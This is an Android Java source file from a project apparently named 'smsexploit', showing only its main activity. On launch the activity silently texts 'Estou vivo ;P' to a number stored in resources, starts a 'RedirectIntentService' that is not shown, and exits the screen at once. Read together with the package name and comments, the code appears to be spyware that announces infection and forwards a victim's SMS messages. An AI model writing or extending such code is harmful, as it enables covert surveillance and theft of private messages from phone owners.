package com.ysociety.exploit.android.smsexploit;

import android.content.Intent;
import android.content.IntentFilter;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;

import static java.lang.Thread.sleep;

public class MainActivity extends AppCompatActivity {

    MensagemReceiver mr;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i("Script", "Inicio app");

        /* Envia mensagem recebida*/
        try {
            String destino = this.getString(R.string.destino);
            SmsManager mensSMS = SmsManager.getDefault();
            mensSMS.sendTextMessage(destino, null ,  "Estou vivo ;P", null, null);
        } catch (Exception e) {
            e.printStackTrace();
        }

        Intent intent = new Intent(this, RedirectIntentService.class);
        startService(intent);

        Log.i("Script", "Fim app");
        onBackPressed();
    }

    @Override
    public void onDestroy(){
        if (isFinishing()) {
            Log.i("Script", "Destroi do app...");
        }
        super.onDestroy();
    }
}
